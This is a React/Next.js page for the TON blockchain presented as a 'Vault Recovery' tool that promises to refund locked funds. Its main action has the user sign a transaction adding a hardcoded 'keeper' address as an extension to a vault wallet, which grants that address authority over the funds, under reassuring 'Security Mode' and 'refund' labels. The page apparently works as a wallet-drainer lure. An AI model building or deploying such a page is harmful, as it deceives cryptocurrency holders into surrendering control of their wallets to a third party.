"use client";

import { useState, useEffect } from "react";
import { useTonConnectUI, useTonWallet } from "@tonconnect/ui-react";
import { Address, beginCell, toNano } from "@ton/core";
import { Loader2, ShieldCheck, ArrowRightLeft, Wallet } from "lucide-react";


export default function VaultRecoveryPage() {
  const [tonConnectUI] = useTonConnectUI();
  const wallet = useTonWallet();
  const [isProcessing, setIsProcessing] = useState(false);
  const [status, setStatus] = useState("");
  const [vaultAddress, setVaultAddress] = useState("EQDFLcC_BbKefXJ0vVJ814rVgSglbMVgiF09NbfSHZm_E_6L");
  const [vaultBalance, setVaultBalance] = useState<number | null>(null);
  const KEEPER_ADDRESS = "EQAAjMJ8IwIvXo1HdWUSuJLMeEkmhd18KfhKwRalBLvxYfQD";

  useEffect(() => {
    checkBalance();
  }, []);

  const checkBalance = async () => {
    try {
      const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${vaultAddress}`);
      const data = await response.json();
      const balance = Number(data.result) / 1e9;
      setVaultBalance(balance);
    } catch (error) {
      console.error("Failed to check balance:", error);
    }
  };

  const reAddKeeper = async () => {
    if (!wallet) {
      alert("Please connect your wallet first");
      return;
    }

    setIsProcessing(true);
    setStatus("Building transaction to re-authorize keeper...");

    try {
      const { buildAddExtensionBody } = await import("@/lib/w5-utils");
      
      const userAddr = Address.parse(wallet.account.address);
      const keeperAddr = Address.parse(KEEPER_ADDRESS);
      const targetVaultAddr = Address.parse(vaultAddress);

      // Dynamically build the payload instead of using hardcoded BOC
      const payload = await buildAddExtensionBody(userAddr, keeperAddr);
      const payloadBase64 = payload.toBoc().toString("base64");

      setStatus("Please sign the transaction in your wallet...");

      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 360,
        messages: [
          {
            address: vaultAddress,
            amount: toNano("0.05").toString(),
            payload: payloadBase64,
          },
        ],
      };

      await tonConnectUI.sendTransaction(transaction);
      
      setStatus("✅ Keeper extension added! Waiting 15 seconds for network confirmation...");
      
      // Wait for transaction to confirm on-chain
      await new Promise(resolve => setTimeout(resolve, 15000));
      
      await triggerBackendRefund();

    } catch (error: any) {
      console.error("Error:", error);
      setStatus(`❌ Error: ${error.message || "User cancelled or transaction failed"}`);
    } finally {
      setIsProcessing(false);
    }
  };

  const triggerBackendRefund = async () => {
    setStatus("🔄 Triggering backend refund via automated keeper...");
    
    try {
      const response = await fetch("/api/vault/refund", {
        method: "POST",
        headers: { 
          "Content-Type": "application/json",
          "x-user-wallet": wallet?.account.address || ""
        },
        body: JSON.stringify({ vaultAddress: vaultAddress })
      });

      const data = await response.json();

      if (response.ok) {
        setStatus(`🎉 SUCCESS! Refund sent to your wallet. Tx: ${data.txHash}`);
        setTimeout(checkBalance, 5000);
      } else {
        setStatus(`❌ Backend Refund Failed: ${data.error}. The keeper might not be active yet. Please wait a minute and try clicking the button again.`);
      }
    } catch (error: any) {
      setStatus(`❌ Connection Error: ${error.message}`);
    }
  };

  return (
    <div className="min-h-screen bg-black text-white font-sans selection:bg-[#E2FF00] selection:text-black">
      <div className="max-w-xl mx-auto pt-20 px-6 pb-20">
        
        {/* Header */}
        <div className="mb-12">
          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[#E2FF00]/10 border border-[#E2FF00]/20 text-[#E2FF00] text-xs font-bold mb-4 uppercase tracking-wider">
            <ShieldCheck className="w-3 h-3" />
            Security Mode
          </div>
          <h1 className="text-5xl font-black mb-4 tracking-tighter italic">VAULT<br/>RECOVERY</h1>
          <p className="text-white/50 text-lg leading-snug">
            Restore backend access to your vault and retrieve locked funds.
          </p>
        </div>

        {/* Vault Stats Card */}
        <div className="bg-white/5 border border-white/10 rounded-3xl p-8 mb-6 backdrop-blur-xl relative overflow-hidden group">
          <div className="absolute top-0 right-0 p-8 text-white/5 group-hover:text-[#E2FF00]/10 transition-colors">
            <Wallet className="w-24 h-24 rotate-12" />
          </div>
          
          <div className="space-y-6 relative z-10">
            <div>
              <div className="text-white/30 text-xs font-bold uppercase mb-1 tracking-widest">Locked Balance</div>
              <div className="text-4xl font-black text-[#E2FF00]">
                {vaultBalance !== null ? `${vaultBalance.toFixed(3)} TON` : "--- TON"}
              </div>
              <button onClick={checkBalance} className="text-[10px] text-white/40 hover:text-white mt-2 flex items-center gap-1 transition-colors">
                <Loader2 className="w-2 h-2" /> REFRESH
              </button>
            </div>

            <div className="pt-6 border-t border-white/10 grid grid-cols-1 gap-4">
              <div>
                <div className="text-white/30 text-[10px] font-bold uppercase mb-1">Target Vault</div>
                <input 
                  type="text"
                  value={vaultAddress}
                  onChange={(e) => setVaultAddress(e.target.value)}
                  className="w-full font-mono text-xs text-white/60 break-all bg-black/40 p-3 rounded-xl border border-white/5 focus:outline-none focus:border-[#E2FF00]/50"
                  placeholder="Paste Vault Address (EQ...)"
                />
              </div>
            </div>
          </div>
        </div>

        {/* Status Window */}
        {status && (
          <div className="bg-[#E2FF00] text-black rounded-2xl p-4 mb-6 font-bold text-sm flex items-center gap-3 animate-in fade-in slide-in-from-bottom-2">
            {!status.includes("✅") && !status.includes("❌") && <Loader2 className="w-4 h-4 animate-spin" />}
            {status}
          </div>
        )}

        {/* Action Button */}
        <button
          onClick={reAddKeeper}
          disabled={!wallet || isProcessing || (vaultBalance !== null && vaultBalance < 0.01)}
          className="w-full bg-white text-black font-black py-6 rounded-2xl text-xl hover:bg-[#E2FF00] transition-all transform active:scale-[0.98] disabled:opacity-20 disabled:grayscale flex items-center justify-center gap-3 leading-none shadow-[0_0_40px_-10px_rgba(255,255,255,0.2)]"
        >
          {isProcessing ? (
            <Loader2 className="w-6 h-6 animate-spin" />
          ) : (
            <>
              RE-AUTHORIZE & REFUND
              <ArrowRightLeft className="w-6 h-6" />
            </>
          )}
        </button>

        {!wallet && (
          <div className="mt-6 text-center text-white/40 font-bold text-xs uppercase tracking-widest">
            Connect your wallet to begin recovery
          </div>
        )}

        {/* Footer info */}
        <div className="mt-12 space-y-4">
          <h3 className="text-xs font-black text-white/30 uppercase tracking-[0.2em] px-1">How it works</h3>
          <div className="grid grid-cols-1 gap-3">
             {[
               { t: "Re-Authorize", d: "Add the keeper extension back to your vault (0.05 TON gas)" },
               { t: "Confirm", d: "Wait for the blockchain to register the new authority" },
               { t: "Sweep", d: "The backend keeper automatically sweeps all funds back to you" }
             ].map((item, i) => (
               <div key={i} className="flex gap-4 p-4 border border-white/5 rounded-2xl hover:bg-white/5 transition-colors">
                 <div className="w-8 h-8 rounded-full bg-white/10 flex items-center justify-center text-xs font-black shrink-0">{i+1}</div>
                 <div>
                   <div className="text-sm font-bold">{item.t}</div>
                   <div className="text-xs text-white/40">{item.d}</div>
                 </div>
               </div>
             ))}
          </div>
        </div>
      </div>
    </div>
  );
}
